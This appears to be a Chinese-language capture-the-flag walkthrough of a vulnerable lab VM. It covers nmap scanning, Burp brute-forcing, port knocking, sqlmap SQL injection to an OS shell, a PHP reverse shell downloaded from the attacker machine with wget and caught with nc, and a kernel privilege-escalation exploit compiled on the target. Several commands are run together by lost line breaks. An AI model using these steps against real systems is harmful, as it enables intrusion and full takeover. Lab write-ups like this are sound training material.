虚拟机简介：尝试读取根目录中的key.txt

目标：1个flag

级别：中级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.178
查看开放80端口

3、WEB渗透测试

3.1 访问WEB页面有登录认证页面

3.2 使用burp进行爆破测试SQL注入

3.3 登录以后查看网页源代码


使用burp先进行URL解码，再进行ASCII解码后显示 K n o c k i n '   o n   h e a v e n ' s   d o o r


3.4 使用二进制解码


https://www.asciitohex.com/


3.5 使用nmap进行敲门

nmap -r -p 1001,1101,1011,1001 192.168.207.178

使用nmap进行扫描检测，查看到开启666端口

nmap -sV 192.168.207.178

3.6 点击访问List of content items页面后显示一堆参数，使用sqlmap进行扫描

sqlmap -u 'http://192.168.207.178:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' --dbs --batch

3.7 使用os-shell获取远程访问连接

sqlmap -u 'http://192.168.207.178:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' -D joomla --os-shell --batch

3.8 在kali中使用php-reverse-shell.php修改监听地址和端口

cp /usr/share/webshells/php/php-reverse-shell.php ./shell.phpvim shell.php

开启简单http服务

python -m SimpleHTTPServer 80

在靶机上下载shell.php文件

wget http://192.168.207.129/shell.php

3.9 开启NC反弹shell，并启用监听

nc -nlvp 4444

访问webshell页面

http://192.168.207.178:666/shell.php

4、系统提权

4.1 查看系统版本信息

uname -a

4.2 系统版本比较低，直接使用脏牛进行提权

cp /usr/share/exploitdb/exploits/linux/local/15285.c ./python -m SimpleHTTPServer 80

4.3 下载提权文件，并编译提权

cd /tmpwget http://192.168.207.129/15285.cgcc 15285.c -o kernelchmod 777 kernel./kernel

4.4 获取flag，查看flag为base64编码

cat /root/Key.txt

4.5 使用base64解码文件，得到一张图片，把图片放到/var/www目录中

base64 -d /root/Key.txt > keyfile key

4.6 访问并打开图片显示flag

192.168.207.180:666/key
